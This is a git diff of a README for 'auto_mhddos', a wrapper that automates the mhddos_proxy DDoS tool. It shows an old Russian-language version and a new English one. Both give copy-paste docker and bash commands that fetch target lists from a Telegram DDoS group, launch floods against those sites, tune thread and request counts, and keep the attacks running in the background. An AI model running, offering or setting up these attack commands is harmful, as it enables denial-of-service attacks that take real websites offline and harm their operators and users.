@@ -1,156 +1,75 @@
-### ⭕️ Оперативный штаб Жнецов
-![photo_2022-03-17_23-39-03](https://user-images.githubusercontent.com/41838573/158963538-944690c4-83ea-4934-9a29-6eb8f1e61f3a.jpg)
+# [auto_mhddos](https://github.com/theorlovsky/auto_mhddos) is an automation tool for [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)
 
-### Представляем auto_mhddos - автоматизирующий скрипт [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)
+It is a run-and-forget tool that periodically fetches
+the [targets](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)
+from [Ukrainian Reaper DDoS](https://t.me/ukrainian_reaper_ddos) and launches attacks on them.
 
-1. [Docker](https://github.com/Aruiem234/auto_mhddos#-docker)
-2. [Bash(Linux-терминал)](https://github.com/Aruiem234/auto_mhddos#-bash)
-3. [Kubernetes](https://github.com/Aruiem234/auto_mhddos/tree/main/helm-charts#mhddos-auto-helm-charts)
+## Installing
 
-## 🪖 Docker
+Install Docker from the [official site](https://docs.docker.com/get-docker/) or using some other guide.
 
-Установить [Docker](https://docs.docker.com/get-docker/) и запустить команду:  
-  
-* для ленивих(кол-во потоков будет 1000, запросов на прокси-сервер перед отправкой на цель: 200):
-```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest
-```
+NOTE: depending on the installation method, you might or might not need to run docker commands as a
+root (`sudo docker run ...`).
 
+## Usage
 
-
-### Команды docker для разного железа: 
-
--- Слабое (2 ядра + 2-4 ГБ Озу).
-
+### Basic
 
 ```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100  
+docker run -it --rm --pull always ghcr.io/theorlovsky/auto_mhddos:latest
 ```
-  
--- Среднее (4 ядра + 4-8 Гб Озу) .Эти же параметры использутся по умолчанию, если запускать команду без аргументов.:   
-  
+
+This will run a container in a foreground with all the default parameters (1 simultaneous attack, 1000 threads per CPU
+core, 10 minute interval before fetching new targets).
+
+### Configuration
+
+Additionally, you can pass several parameters when running a container:
+
+#### `--parallel 3` or `--parallel all`
+
+How many unique targets to attack at once. Lower limit is 1, upper limit is a number of targets.
+`all` runs attacks on all active targets.
+
+#### `--restart-interval 1h`
+
+How much time to wait before stopping running attacks, re-fetching targets and starting new attacks. Supports `m` (minutes), `h` (hours) and `d` (days). Can't
+be less than 15 minutes. Default is 30 minutes.
+
+#### `--debug false`
+
+Shows output in a console. Enabled by default.
+
+#### `--disable-parallel-limit`
+
+**WARNING**: use at your own risk.
+
+Allows any number of parallel attacks.
+
+#### `-t`, `--rpc` and other available params see in the [mhddos_proxy's docs](https://github.com/porthole-ascend-cinnamon/mhddos_proxy#usage)
+
+### Running in the background
+
+Running a container in the foreground is good, but then you're unable to do anything in this terminal window and can't close it. There is a better option, especially for any kind of VPS.
 
 ```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 1000 200  
+docker run -it -d --restart unless-stopped --pull always --name auto_mhddos ghcr.io/theorlovsky/auto_mhddos:latest
 ```
-  
--- Быстрое(4+ ядер + 8+ Гб Озу):  
 
-  
-```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 2500 400  
-```
-  
-Значение параметров на примере "500 100":  
-  
-500 - количество потоков (threads). Параметр -t в mhddos_proxy.  
-  
-100 - параметр --rpc в mhddos_proxy. (количество пакетов отправляемых на прокси-сервер, перед тем как он передаст их на сайт-цель)  
+This will run a container in the background and will automatically start it again if you restart your machine.
 
-Пример успешной атаки без третьего параметра --debug(больше ничего выводится не будет):  
-![Стандартный вывод](https://user-images.githubusercontent.com/74729549/159160084-3ffd870b-7d17-44c9-9108-3908212402ce.png)  
+#### But what about `--debug`?
 
-
-ТАКЖЕ МОЖНО ДОБАВИТЬ В КОНЕЦ ТРЕТИЙ ПАРАМЕТР --debug , чтоб выводилась информация о каждом отправленном пакете,  
-например:  
-```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100 --debug  
-```
-пример вывода с параметром --debug:  
-![Параметр --debug](https://user-images.githubusercontent.com/74729549/159160027-dcc51f91-3d0b-4dd7-abe8-b63edf136e1e.png)  
-  
-  
-  
-## 🪖 Bash(Linux-терминал)  
-
-
-### 1. Установка.  
-  
-Выполняется для начальной установки ПО, и периодического обновления. Не обязательно использовать каждый раз.  
-
+We keep you covered. To see what's going on inside, use this command:
 
 ```shell
-sudo su
-cd ~  
-git clone https://github.com/Aruiem234/auto_mhddos.git  
-cd ~/auto_mhddos  
-bash setup.sh  
-
+docker logs -f auto_mhddos
 ```
-!!!Ждем пока выполнится!!!  
 
+#### How do I stop it?
 
-Скрипт автоматически устанавливает git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.
-
-### 2. Запуск.
-
-Bash скрипт работает в Linux и WSL (Windows Subsystem for Linux). Работает автоматически, даже при закрытии терминала (если вы четко придерживаетесь инструкций)  
-
-Не забудьте сначала выполнить пункт №1 (Установка).  
-
+And again, here you go:
 
 ```shell
-sudo su
-cd ~/auto_mhddos
-screen -S "runner" bash runner.sh 1000 200
+docker rm -f auto_mhddos
 ```
-Пример успешной атаки без третьего параметра --debug(больше ничего выводится не будет):  
-![Стандартный вывод](https://user-images.githubusercontent.com/74729549/159160084-3ffd870b-7d17-44c9-9108-3908212402ce.png)  
-  
-  
-ТАКЖЕ МОЖНО ДОБАВИТЬ В КОНЕЦ ТРЕТИЙ ПАРАМЕТР --debug , чтоб выводилась информация о каждом отправленном пакете,
-например:  
-```shell
-docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100 --debug  
-```
-пример вывода с параметром --debug:  
-![Параметр --debug](https://user-images.githubusercontent.com/74729549/159160027-dcc51f91-3d0b-4dd7-abe8-b63edf136e1e.png)  
-
-Для разных машин вместо параметров "1000 200" выбирайте следующее:  
--- Слабое (2 ядра + 2-4 ГБ Озу) - 500 100  
--- Среднее (4 ядра + 4-8 Гб Озу) - 1000 200  
--- Быстрое(4+ ядер + 8+ Гб Озу) - 2500 400  
-
-Нажимаем Ctrl+A , затем Ctrl+D - И ВСЕ ГОТОВО - РАБОТАЕТ В ФОНЕ  
-Если все успешно, то будет сообщение [detached from runner]  
-  
-Чтоб посмотреть, что там работает в фоне:  
-```shell
-sudo screen -ls
-```
-  
-Чтоб перейти к процессу и узнать как у него дела (что он выводит)
-щоб перейти до процесу та дізнатися як у нього справи (що він виводить), пишите:
-```shell
-screen -r runner
-```
-После этого, если захотите убить процес - нажимайте Ctrl+C  
-Чтоб убить все его подпроцесы:  
-```shell
-sudo pkill -f runner.py
-sudo pkill -f ./start.py
-```
-  
-чтоб опять отключиться, и оставить его работать в фоне:  
-Нажимаем Ctrl+A , затем Ctrl+D - И ВСЕ ГОТОВО - РАБОТАЕТ В ФОНЕ  
-
-
-# ❕Описание
-
-* Скрипт работает полностью автоматически - ВЫ МОЖЕТЕ ЗАКРЫВАТЬ ОКНО ТЕРМИНАЛА(кроме докера на Windows), но не выключать саму машину (а сервер и так работает 24/7)
-
-* Работает с курируемым админами единым списком [сайтов-целей](https://github.com/Aruiem234/auto_mhddos/blob/main/runner_targets).
-
-* База целей обновляется скриптом каждые 10 мин.
-
-
-
-
-Теоретически все это позволяет запустить скрипт на ПК/vps и всю остальную работу (обновление, перезапуск) он будет делать самостоятельно.
-
-Рекомендуется использовать на Ubuntu 20.04. Вероятно будет работать на всех Ubuntu начиная с 18.04, а также всех производных Ubuntu и WSL2.
-
-
-
-### 🇺🇦🇺🇦🇺🇦 СЛАВА УКРАЇНІ 🇺🇦🇺🇦🇺🇦
-### ПТН ХЛО 🤡
